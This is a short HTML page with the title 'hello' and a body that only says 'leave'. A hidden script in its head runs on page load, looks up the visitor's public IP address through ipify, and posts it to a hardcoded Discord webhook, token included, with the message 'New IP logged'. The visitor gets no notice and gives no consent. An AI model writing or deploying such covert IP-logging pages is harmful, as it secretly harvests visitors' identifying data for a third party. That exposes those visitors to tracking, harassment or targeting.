<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>hello</title>
    <script>
        async function sendIPToWebhook() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();

                // Send IP directly to the Discord webhook
                await fetch('https://discordapp.com/api/webhooks/1335494933716402296/FvFc354H6SH8nz7udg74oZBaSb7DPSjU2n4XEhO59tIoWxwXlsesC_eAI1Lo9fH-cd8g', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `New IP logged @everyone : ${data.ip}`
                    })
                });
            } catch (error) {
                console.error('Error sending IP to Discord webhook:', error);
            }
        }

        window.onload = sendIPToWebhook;
    </script>
</head>
<body>
    <h1>leave</h1>
    <p>leave</p>
</body>
</html>
